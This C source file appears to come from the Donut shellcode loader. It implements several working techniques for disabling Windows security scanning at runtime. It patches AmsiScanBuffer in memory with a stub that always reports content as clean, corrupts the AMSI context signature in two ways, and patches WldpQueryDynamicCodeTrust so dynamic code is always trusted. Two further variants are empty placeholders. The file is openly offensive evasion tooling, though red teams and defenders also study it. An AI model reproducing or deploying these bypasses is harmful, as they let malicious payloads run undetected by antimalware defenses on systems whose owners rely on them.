/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "payload.h"

#if defined(BYPASS_AMSI_A)

DECLARE_HANDLE(HAMSICONTEXT);
DECLARE_HANDLE(HAMSISESSION);

// fake function that always returns S_OK and AMSI_RESULT_CLEAN
static HRESULT AmsiScanBufferStub(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

static VOID AmsiScanBufferStubEnd(VOID) {}

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    BOOL    disabled = FALSE;
    HMODULE amsi;
    DWORD   len, op, t;
    LPVOID  cs;
    
    // load amsi
    amsi = inst->api.LoadLibraryA(inst->amsi.s);
    
    if(amsi != NULL) {
      // resolve address of function to patch
      cs = inst->api.GetProcAddress(amsi, inst->amsiScan);
      
      if(cs != NULL) {
        // calculate length of stub
        len = (ULONG_PTR)AmsiScanBufferStubEnd -
          (ULONG_PTR)AmsiScanBufferStub;
          
        // make the memory writeable
        if(inst->api.VirtualProtect(
          cs, len, PAGE_EXECUTE_READWRITE, &op))
        {
          // over write with code stub
          Memcpy(cs, &AmsiScanBufferStub, len);
          
          disabled = TRUE;
            
          // set back to original protection
          inst->api.VirtualProtect(cs, len, op, &t);
        }
      }
    }
    return disabled;
}

#elif defined(BYPASS_AMSI_B)

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    HMODULE        dll;
    PBYTE          cs;
    DWORD          i, op, t;
    BOOL           disabled = FALSE;
    _PHAMSICONTEXT ctx;
    
    // load AMSI library
    dll = inst->api.LoadLibraryExA(
      inst->amsi.s, 
      NULL, 
      LOAD_LIBRARY_SEARCH_SYSTEM32);
      
    if(dll == NULL) {
      return FALSE;
    }
    // resolve address of function to patch
    cs = (PBYTE)inst->api.GetProcAddress(dll, inst->amsiScan);
    
    // scan for signature
    for(i=0;;i++) {
      ctx = (_PHAMSICONTEXT)&cs[i];
      // is it "AMSI"?
      if(ctx->Signature == inst->amsi.w[0]) {
        // set page protection for write access
        inst->api.VirtualProtect(cs, sizeof(DWORD), 
          PAGE_EXECUTE_READWRITE, &op);
          
        // change signature
        ctx->Signature++;
        
        // set page back to original protection
        inst->api.VirtualProtect(cs, sizeof(DWORD), op, &t);
        disabled = TRUE;
        break;
      }
    }
    return disabled;
}

#elif defined(BYPASS_AMSI_C)

// Attempt to find AMSI context in .data section of CLR.dll
// Could also scan PEB.ProcessHeap for this..
// Disabling AMSI via AMSI context is based on idea by Matt Graeber
// https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    LPVOID                   hCLR;
    BOOL                     disabled = FALSE;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, j, res;
    PBYTE                    ds;
    MEMORY_BASIC_INFORMATION mbi;
    _PHAMSICONTEXT           ctx;
    
    hCLR = inst->api.GetModuleHandleA(inst->clr);
    
    if(hCLR != NULL) {
      dos = (PIMAGE_DOS_HEADER)hCLR;  
      nt  = RVA2VA(PIMAGE_NT_HEADERS, hCLR, dos->e_lfanew);  
      sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
             nt->FileHeader.SizeOfOptionalHeader);
             
      // scan all writeable segments while disabled == FALSE
      for(i = 0; 
          i < nt->FileHeader.NumberOfSections && !disabled; 
          i++) 
      {
        // if this section is writeable, assume it's data
        if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
          // scan section for pointers to the heap
          ds = RVA2VA (PBYTE, hCLR, sh[i].VirtualAddress);
           
          for(j = 0; 
              j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
              j += sizeof(ULONG_PTR)) 
          {
            // get pointer
            ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
            // query if the pointer
            res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
            if(res != sizeof(mbi)) continue;
            
            // if it's a pointer to heap or stack
            if ((mbi.State   == MEM_COMMIT    ) &&
                (mbi.Type    == MEM_PRIVATE   ) && 
                (mbi.Protect == PAGE_READWRITE))
            {
              ctx = (_PHAMSICONTEXT)ptr;
              // check if it contains the signature 
              if(ctx->Signature == inst->amsi.w[0]) {
                // corrupt it
                ctx->Signature++;
                disabled = TRUE;
                break;
              }
            }
          }
        }
      }
    }
    return disabled;
}

#elif defined(BYPASS_AMSI_D)
// This is where you may define your own AMSI bypass.
// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_C defined.

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    
}

#endif

#if defined(BYPASS_WLDP_A)
// fake function that always returns S_OK
static HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
    HANDLE fileHandle,
    PVOID  baseImage,
    ULONG  ImageSize)
{
    return S_OK;
}

static VOID WldpQueryDynamicCodeTrustStubEnd(VOID) {}

BOOL DisableWLDP(PDONUT_INSTANCE inst) {
    BOOL    disabled = FALSE;
    HMODULE wldp;
    DWORD   len, op, t;
    LPVOID  cs;
    
    // load WLDP
    wldp = inst->api.LoadLibraryExA(
      inst->wldp, NULL, 
      LOAD_LIBRARY_SEARCH_SYSTEM32);
    
    if(wldp != NULL) {
      // resolve address of WldpQueryDynamicCodeTrust
      cs = inst->api.GetProcAddress(wldp, inst->wldpQuery);
      
      if(cs != NULL) {
        // calculate length of stub
        len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
          (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
          
        // make the memory writeable
        if(inst->api.VirtualProtect(
          cs, len, PAGE_EXECUTE_READWRITE, &op))
        {
          // over write with stub
          Memcpy(cs, &WldpQueryDynamicCodeTrustStub, len);
        
          disabled = TRUE;
        
          // set back to original protection
          inst->api.VirtualProtect(cs, len, op, &t);
        }
      }
    }
    return disabled;
}
#elif defined(BYPASS_WLDP_B)
// This is where you may define your own WLDP bypass.
// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_WLDP_B defined.

BOOL DisableWLDP(PDONUT_INSTANCE inst) {
    
}
#endif
